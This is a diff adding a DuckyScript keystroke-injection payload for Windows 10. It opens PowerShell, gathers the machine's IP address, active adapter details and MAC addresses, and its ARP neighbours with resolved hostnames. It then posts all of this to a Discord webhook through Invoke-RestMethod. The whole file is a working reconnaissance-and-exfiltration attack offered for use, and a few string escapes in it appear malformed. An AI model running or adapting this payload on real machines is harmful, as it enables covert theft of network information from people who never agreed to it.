@@ -1,0 +1,93 @@
+REM Author: Woozy
+REM Description: This script will exfiltrate network information from a Windows 10 machine and send it to a Discord webhook.
+REM Version:	1.0
+REM Category:   Recon and Exfiltration
+REM Target:	Windows 10
+
+REM Open PowerShell
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+STRING $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -eq (Get-NetAdapter | Where-Object { $_.Status -eq "Up" }).InterfaceAlias }).IPAddress
+ENTER
+DELAY 500
+
+STRING $localIPRange = $localIP.Substring(0, $localIP.LastIndexOf("."))
+ENTER
+DELAY 500
+
+STRING $networkInfo = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object Name, MacAddress, InterfaceDescription, Status
+ENTER
+DELAY 500
+
+STRING $ipInfo = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -eq (Get-NetAdapter | Where-Object { $_.Status -eq "Up" }).InterfaceAlias } | Select-Object IPAddress, InterfaceAlias
+ENTER
+DELAY 500
+
+STRING $arpInfo = Get-NetNeighbor | Where-Object { $_.IPAddress -like "$localIPRange*" } | Select-Object IPAddress, LinkLayerAddress, State
+ENTER
+DELAY 500
+
+STRING $reachableIPs = $arpInfo | Where-Object { $_.State -eq "Reachable" }
+ENTER
+DELAY 500
+
+STRING $staleIPs = $arpInfo | Where-Object { $_.State -eq "Stale" }
+ENTER
+DELAY 500
+
+STRINGLN $reachableIPNames = foreach ($ip in $reachableIPs.IPAddress) {
+STRINGLN try {
+STRINGLN $name = [System.Net.Dns]::GetHostEntry($ip).HostName
+STRINGLN } catch {
+STRINGLN $name = "Unknown"
+STRINGLN }
+STRINGLN [PSCustomObject]@{
+STRINGLN IPAddress = $ip
+STRINGLN HostName = $name
+STRINGLN }
+STRING }
+ENTER
+DELAY 500
+
+STRINGLN $staleIPNames = foreach ($ip in $staleIPs.IPAddress) {
+STRINGLN try {
+STRINGLN $name = [System.Net.Dns]::GetHostEntry($ip).HostName
+STRINGLN } catch {
+STRINGLN $name = "Unknown"
+STRINGLN }
+STRINGLN [PSCustomObject]@{
+STRINGLN IPAddress = $ip
+STRINGLN HostName = $name
+STRINGLN }
+STRING }
+ENTER
+DELAY 500
+
+STRING $networkInfoMessage = "Network Information:`"
+ENTER
+STRING $networkInfoMessage += $networkInfo | Format-Table -AutoSize | Out-String
+ENTER
+DELAY 500
+
+STRING $message = @{
+STRINGLN "content" = "Reachable IPs:`$($reachableIPNames | Format-Table -AutoSize | Out-String)`Stale IPs:`n$($staleIPNames | Format-Table -AutoSize | Out-String)`$networkInfoMessage"
+STRING } | ConvertTo-Json
+ENTER
+DELAY 500
+
+STRING $webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"
+ENTER
+DELAY 500
+
+REM Invoke the REST method to send the message
+STRING Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $message -ContentType "application/json"
+ENTER
+DELAY 500
+
+REM Exit PowerShell
+STRING exit
+ENTER
